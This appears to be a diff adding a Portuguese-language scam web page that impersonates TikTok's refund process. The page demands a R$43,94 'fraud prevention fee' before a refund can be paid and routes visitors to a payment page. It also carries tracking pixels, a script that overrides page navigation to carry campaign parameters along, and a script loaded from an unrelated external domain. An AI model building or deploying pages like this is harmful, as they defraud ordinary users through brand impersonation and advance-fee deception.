@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prevenção Contra Fraudes</title>
+    <!-- TikTok Pixel Code Start -->
+    <script>
+      !(function (w, d, t) {
+      w.TiktokAnalyticsObject = t;
+      var ttq = (w[t] = w[t] || []);
+      (ttq.methods = [
+        "page",
+        "track",
+        "identify",
+        "instances",
+        "debug",
+        "on",
+        "off",
+        "once",
+        "ready",
+        "alias",
+        "group",
+        "enableCookie",
+        "disableCookie",
+        "holdConsent",
+        "revokeConsent",
+        "grantConsent",
+      ]),
+        (ttq.setAndDefer = function (t, e) {
+        t[e] = function () {
+          t.push([e].concat(Array.prototype.slice.call(arguments, 0)));
+        };
+        });
+      for (var i = 0; i < ttq.methods.length; i++)
+        ttq.setAndDefer(ttq, ttq.methods[i]);
+      (ttq.instance = function (t) {
+        for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)
+        ttq.setAndDefer(e, ttq.methods[n]);
+        return e;
+      }),
+        (ttq.load = function (e, n) {
+        var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
+          o = n && n.partner;
+        (ttq._i = ttq._i || {}),
+          (ttq._i[e] = []),
+          (ttq._i[e]._u = r),
+          (ttq._t = ttq._t || {}),
+          (ttq._t[e] = +new Date()),
+          (ttq._o = ttq._o || {}),
+          (ttq._o[e] = n || {});
+        n = document.createElement("script");
+        (n.type = "text/javascript"),
+          (n.async = !0),
+          (n.src = r + "?sdkid=" + e + "&lib=" + t);
+        e = document.getElementsByTagName("script")[0];
+        e.parentNode.insertBefore(n, e);
+        });
+  
+      ttq.load("D4L781BC77U4IAHDOBPG");
+      ttq.page();
+      })(window, document, "ttq");
+    </script>
+    <!-- TikTok Pixel Code End -->
+    <!-- Script para preservar UTMs e salvar no localStorage -->
+    <script>
+      (function() {
+      'use strict';
+      console.log('🔗 [UP1] Script de preservação de UTM params carregado...');
+      
+      // Função para extrair e salvar UTMs da URL
+      function saveUtmParamsFromUrl() {
+        try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmParams = {};
+        
+        const utmFields = [
+          "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
+          "click_id", "fbclid", "gclid", "msclkid", "ttclid"
+        ];
+        
+        // Extrai UTMs da URL
+        utmFields.forEach((param) => {
+          if (urlParams.has(param)) {
+          utmParams[param] = urlParams.get(param);
+          }
+        });
+        
+        // Se encontrou UTMs na URL, salva no localStorage
+        if (Object.keys(utmParams).length > 0) {
+          localStorage.setItem("utm_params", JSON.stringify(utmParams));
+          console.log("✅ [UP1] UTM params salvos no localStorage:", utmParams);
+        } else {
+          // Se não encontrou na URL, tenta recuperar do localStorage
+          const storedUtm = localStorage.getItem("utm_params");
+          if (storedUtm) {
+          console.log("✅ [UP1] UTM params recuperados do localStorage:", JSON.parse(storedUtm));
+          }
+        }
+        } catch (e) {
+        console.warn("⚠️ [UP1] Erro ao processar UTMs:", e);
+        }
+      }
+      
+      // Executa imediatamente
+      saveUtmParamsFromUrl();
+      
+      // Também intercepta location.href para preservar UTMs
+      try {
+        const originalLocation = window.location;
+        const locationDescriptor = Object.getOwnPropertyDescriptor(window, 'location') || 
+                     Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window), 'location');
+        
+        if (locationDescriptor && locationDescriptor.set) {
+        const originalHrefSetter = locationDescriptor.set;
+        Object.defineProperty(window, 'location', {
+          set: function(url) {
+          try {
+            const storedUtm = localStorage.getItem("utm_params");
+            if (storedUtm) {
+            const utmData = JSON.parse(storedUtm);
+            const urlObj = new URL(url, window.location.origin);
+            Object.keys(utmData).forEach((key) => {
+              if (!urlObj.searchParams.has(key) && utmData[key]) {
+              urlObj.searchParams.set(key, utmData[key]);
+              }
+            });
+            url = urlObj.toString();
+            console.log('🔄 [UP1] UTMs adicionados à URL:', url);
+            }
+          } catch (e) {
+            console.warn('⚠️ [UP1] Erro ao adicionar UTMs:', e);
+          }
+          return originalHrefSetter.call(window, url);
+          },
+          get: locationDescriptor.get,
+          configurable: true,
+          enumerable: true
+        });
+        }
+      } catch (e) {
+        console.warn('⚠️ [UP1] Erro ao interceptar location:', e);
+      }
+      })();
+    </script>
+
+<script src="https://bonusnovottk.online/checkout/preserve-utm-params.js"></script>
+<!-- API centralizada de pagamento (compartilhada do checkout principal) -->
+<script src="js/payment-api.js"></script>
+<!-- TikTok PIX Tracker - Dispara InitiateCheckout quando PIX é criado (compartilhado) -->
+<script src="js/tiktok-pix-tracker.js"></script>
+<!-- Wrapper para InitiateCheckout (compartilhado) -->
+<script src="js/tiktok-init.js"></script>
+
+    <!-- TikTok Pixel Code End -->
+    <style>
+        body {font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #000; color: #fff;}
+        .container {text-align: center; padding: 20px; border: 1px solid #ccc; border-radius: 10px; box-shadow: 2px 2px 12px rgba(0, 0, 0, 0.1); width: 100%; max-width: 600px; background-color: #000; color: #fff; position: relative;}
+        h2 {font-size: 37px; margin-bottom: 20px; color: #fff;}
+        .note {font-size: 24px; background-color: #000; color: #fff; padding: 20px; border: 1px solid #ddd; border-radius: 10px; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 20px;}
+        button {font-size: 18px; padding: 15px; margin-top: 20px; width: 100%; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;}
+        button:hover {background-color: #45a049;}
+        img {width: 100%; max-width: 300px; height: auto;}
+    </style>
+    
+    <!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-RT8X1RNDME"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-RT8X1RNDME');
+</script>
+    
+    
+    
+</head>
+<body>
+    <div class="container">
+        <img src="images/2fa26c9dd31ce860dc627e5375f58a98.png" alt="TikTok Logo">
+        <h2>Solicitação de Reembolso do TikTok</h2>
+        <div class="note">
+            <p><strong>Importante:</strong> Para processar seu reembolso, é necessário pagar uma taxa de prevenção contra fraudes de R$43,94. Não se preocupe, esse valor será reembolsado junto com o valor do reembolso. Como desculpas pelo desconforto, também enviaremos o saldo pendente na plataforma.</p>
+        </div>
+        <form id="refundForm">
+            <button type="submit">Preencher dados para o reembolso</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById("refundForm").addEventListener("submit", function(event) {
+            event.preventDefault(); window.location.href = "../pagamento5";
+        });
+    </script>
+
+<script async="" id="netlify-rum-container" src="rum" data-netlify-rum-site-id="968eb5ac-3490-4fd7-b557-46a3b6fe8012" data-netlify-deploy-branch="" data-netlify-deploy-context="production" data-netlify-cwv-token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaXRlX2lkIjoiOTY4ZWI1YWMtMzQ5MC00ZmQ3LWI1NTctNDZhM2I2ZmU4MDEyIiwiYWNjb3VudF9pZCI6IjY5MTc0N2NiYzRhYjYyNTFkMzhmMWNiNCIsImRlcGxveV9pZCI6IjY5MjQ5YTZkMmIyZDQ0MTliZTI5MzhhOCIsImlzc3VlciI6Im5mc2VydmVyIn0.7dt0uo19FqPg4uZpgs-Fg3Q4XSao-Wl_TG21Sv5MbIY"></script>
+
+</body></html>
